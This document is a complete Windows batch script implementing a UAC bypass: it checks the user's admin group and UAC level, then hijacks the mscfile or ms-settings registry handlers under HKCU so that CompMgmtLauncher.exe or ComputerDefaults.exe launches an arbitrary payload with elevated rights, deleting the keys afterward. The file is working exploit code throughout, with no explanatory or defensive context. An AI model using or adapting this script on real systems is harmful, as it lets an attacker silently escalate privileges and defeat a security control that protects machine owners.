@echo off
if "%~1" equ "" (set PAYLOAD=cmd.exe) ELSE set "PAYLOAD=%~1"


net session >nul 2>&1 || goto :label
%PAYLOAD% 
exit /b 2


:label
::REQUIREMENTS
whoami /groups|findstr /i "\<S-1-5-32-544\>" >nul 2>&1
if ERRORLEVEL 1 exit /b 1


::Windows Version
for /f "tokens=4-5 delims=. " %%i in ('ver') do set WIN_VER=%%i.%%j


::UAC Level
:: 2 High
:: 5 Default
:: 0 None
set key="HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"
for /f "skip=2 tokens=3" %%U in ('REG QUERY %key% /v ConsentPromptBehaviorAdmin') do set /a "UAC=%%U"


::EXPLOIT
if %UAC% equ 2 exit /b 1
if %UAC% equ 5 (
	for %%V in (6.1 6.2 6.3) do if "%WIN_VER%" == "%%V" call :exploit mscfile CompMgmtLauncher.exe %PAYLOAD%
	if "%WIN_VER%" == "10.0" call :exploit ms-settings ComputerDefaults.exe %PAYLOAD%
)>nul 2>&1
if %UAC% equ 0 powershell -c Start-Process "%PAYLOAD%" -Verb runas


exit /b 0


:exploit <key> <trigger> <payload>
set regPath="HKCU\Software\Classes\%1\shell\open\command"
reg add %regPath% /d "%~3" /f
reg add %regPath% /v DelegateExecute /f
%~2
reg delete "HKCU\Software\Classes\%1" /f
exit /b